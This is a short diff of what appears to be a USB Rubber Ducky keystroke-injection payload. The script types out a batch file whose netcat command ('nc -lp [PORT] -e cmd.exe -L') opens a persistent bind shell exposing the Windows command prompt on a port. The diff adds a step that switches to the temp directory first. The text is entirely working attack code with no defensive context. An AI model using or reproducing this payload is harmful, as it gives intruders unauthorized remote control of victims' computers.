@@ -47,6 +47,8 @@ DELAY 500
 REM --> Creates a batch file to start listening 
 STRING copy con Start.bat
 ENTER
+STRING cd %TEMP%
+ENTER
 STRING nc -lp [PORT] -vv -e cmd.exe -L
 ENTER
 CONTROL z
